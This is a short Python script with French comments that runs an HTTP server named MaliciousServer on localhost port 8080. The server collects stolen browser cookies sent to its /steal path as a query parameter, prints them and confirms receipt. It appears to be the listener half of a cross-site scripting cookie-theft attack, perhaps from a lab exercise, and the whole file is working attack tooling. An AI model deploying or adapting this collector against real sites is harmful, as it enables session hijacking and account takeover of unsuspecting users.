from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse

class MaliciousServer(BaseHTTPRequestHandler):
    def do_GET(self):
        # Vérification du chemin
        if self.path.startswith('/steal'):
            # Extraire le paramètre "cookie" depuis l'URL
            query = urllib.parse.urlparse(self.path).query
            params = urllib.parse.parse_qs(query)

            # Récupérer la valeur du cookie
            cookie = params.get('cookie', [''])[0]  # Par défaut, retourne une chaîne vide si absent

            # Afficher les cookies
            print(f"Received cookie: {cookie}")

            # Réponse au client
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Cookie received!")

# Configuration du serveur
host = "127.0.0.1"
port = 8080
server = HTTPServer((host, port), MaliciousServer)
print(f"Server running on http://{host}:{port}")
server.serve_forever()
